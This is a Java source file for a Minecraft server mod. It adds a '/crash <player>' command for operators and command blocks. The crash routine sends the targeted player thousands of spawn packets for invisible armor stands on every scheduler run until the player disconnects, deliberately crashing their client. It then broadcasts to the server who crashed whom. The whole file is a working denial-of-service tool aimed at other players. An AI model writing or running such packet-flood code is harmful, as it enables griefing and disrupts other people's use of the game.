package net.teamfruit.crashmod;

import net.minecraft.command.CommandBase;
import net.minecraft.command.CommandException;
import net.minecraft.command.ICommandSender;
import net.minecraft.command.PlayerNotFoundException;
import net.minecraft.entity.item.EntityArmorStand;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.network.play.server.SPacketSpawnMob;
import net.minecraft.server.MinecraftServer;
import net.minecraft.tileentity.CommandBlockBaseLogic;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.TextComponentString;
import net.minecraft.util.text.TextFormatting;
import org.apache.commons.lang3.StringUtils;
import scala.actors.threadpool.Arrays;

import javax.annotation.Nullable;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;
import java.util.stream.Collectors;

public class CrashCommand extends CommandBase {
    private final CrashMod mod;

    public CrashCommand(CrashMod mod) {
        this.mod = mod;
    }

    @Override
    public String getName() {
        return "crash";
    }

    @Override
    public String getUsage(ICommandSender iCommandSender) {
        return "/crash <player>";
    }

    @Override
    public int getRequiredPermissionLevel() {
        return 3;
    }

    @Override public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
        return sender instanceof CommandBlockBaseLogic || super.checkPermission(server, sender);
    }

    @Override
    public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
        if (args.length == 0) {
            sender.sendMessage(new TextComponentString("/crash <player>"));
            return;
        }
        List<EntityPlayerMP> players = getPlayers(server, sender, args[0]);
        if (players.size() == 0)
            throw new PlayerNotFoundException("commands.generic.player.notFound", args[0]);
        for (EntityPlayerMP player : players) {
            crash(player);
            sender.sendMessage(new TextComponentString(TextFormatting.DARK_GREEN + "[" + TextFormatting.DARK_GREEN + "★" + TextFormatting.DARK_GREEN + "] " + TextFormatting.GREEN + args[0] + "をクラッシュさせました"));
            server.getPlayerList().sendMessage(new TextComponentString(TextFormatting.DARK_PURPLE + "[★] " + TextFormatting.LIGHT_PURPLE + sender.getName() + "が" + TextFormatting.RED + args[0] + "をクラッシュさせました"));
        }
    }

    @Override public List<String> getTabCompletions(MinecraftServer server, ICommandSender sender, String[] args, @Nullable BlockPos targetPos) {
        return args.length == 1 ? getListOfStringsMatchingLastWord(args, server.getOnlinePlayerNames()) : super.getTabCompletions(server, sender, args, targetPos);
    }

    private void crash(final EntityPlayerMP p) {
        this.mod.scheduler.runTaskTimer(new CrashRunnable() {
            int c = 0;

            @Override
            public void run() {
                for (int i = 0; i < 1000; ++i) {
                    ++this.c;
                    EntityArmorStand stand = new EntityArmorStand(p.world);
                    stand.setPosition(p.posX, p.posY + 3.0D, p.posZ);
                    stand.setCustomNameTag("CRASH!");
                    stand.setAlwaysRenderNameTag(false);
                    stand.setInvisible(true);
                    SPacketSpawnMob packet = new SPacketSpawnMob(stand);
                    p.connection.sendPacket(packet);
                }

                if (p.hasDisconnected()) {
                    this.cancel();
                }
            }
        });
    }
}
